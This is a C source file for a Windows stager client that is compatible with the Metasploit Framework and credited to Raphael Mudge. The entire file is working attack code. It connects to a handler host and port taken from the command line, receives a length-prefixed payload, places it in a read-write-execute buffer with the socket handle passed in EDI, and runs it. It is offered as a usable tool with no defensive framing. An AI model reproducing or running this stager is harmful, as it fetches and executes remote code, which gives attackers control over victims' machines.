/*
 * A C-based stager client compat with the Metasploit Framework
 *    based on a discussion on the Metasploit Framework mailing list
 *
 * @author Raphael Mudge (raffi@strategiccyber.com)
 * @license BSD License.
 *
 * Relevant messages:
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
 */

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* init winsock */
void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		WSACleanup();
		ExitProcess(2);
	}
}

/* a quick routine to quit and report why we quit */
void punt(SOCKET my_socket, char * error) {
	closesocket(my_socket);
	WSACleanup();
	ExitProcess(3);
}

/* attempt to receive all of the requested data from the socket */
int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;

		if (nret == SOCKET_ERROR)
			punt(my_socket, "Could not receive data");
	}
	return tret;
}

/* establish a connection to a host:port */
SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;

	/* setup our socket */
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		punt(my_socket, "Could not initialize socket");

	/* resolve our target */
	target = gethostbyname(targetip);
	if (target == NULL)
		punt(my_socket, "Could not resolve target");


	/* copy our target information into the sock */
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	/* attempt to connect */
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		punt(my_socket, "Could not connect to target");

	return my_socket;
}

int argc;
char **argv;

DWORD threadmain(LPVOID params) { // int argc, char * argv[]) {
	ULONG32 size;
	char * buffer;
	void (*function)();

	winsock_init();

	if (argc != 3) {
	  ExitProcess(1);
	}

	/* connect to the handler */
	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));

	/* read the 4-byte length */
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		punt(my_socket, "read a strange or incomplete length value\n");

	/* allocate a RWX buffer */
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
		punt(my_socket, "could not allocate buffer\n");

	/* prepend a little assembly to move our SOCKET value to the EDI register
	   thanks mihi for pointing this out
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
	buffer[0] = 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &my_socket, 4);

	/* read bytes into the buffer */
	count = recv_all(my_socket, buffer + 5, size);

	/* cast our buffer as a function and call it */
	function = (void (*)())buffer;
	function();

	ExitProcess(0);
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
  MSG message;
  DWORD threadID;
  int i;
  char *p, *c;

  // scan the lpCmdLine string for space-delimited fields, counting
  // them in argc.  This will bork if you have tabs or other white-
  // space characters as separators (spaces only!).

  for(argc = 1, p = lpCmdLine; ; p++) {
    if(*p == ' ' || *p == '\0') {
      while(*p == ' ') p++;
      argc++;
    }
    if(!*p) break;
  }

  // on the off chance that there are no arguments, then we will have
  // incremented argc incorrectly, and we can fix it here.

  if(p == lpCmdLine) argc--;

  // Now that we know how many arguments there are, we can allocate
  // space for our argv array.  lpCmdLine does not include the exe
  // name, so I pick one that seems reasonable.

  argv = (char **)malloc(sizeof(char*) * argc);
  memset(argv, 0, sizeof(char*) * argc);
  argv[0] = "winmain";

  // With a place to put them, scan through the command line string
  // and replace spaces (skipping extra spaces) with NULs, saving
  // the string offsets in argv.

  for(i = 1, p = c = lpCmdLine; i != argc; p++) {
    if(*p == ' ' || *p == '\0') {
      *p++ = '\0';
      while(*p == ' ') p++;
      argv[i++] = c;
      c = p;
    }
  }

  CreateThread(NULL, 0, threadmain, NULL, 0, &threadID);
  
  while(GetMessage(&message, NULL, 0, 0) > 0) {
    TranslateMessage(&message);
    DispatchMessage(&message);
  }
}
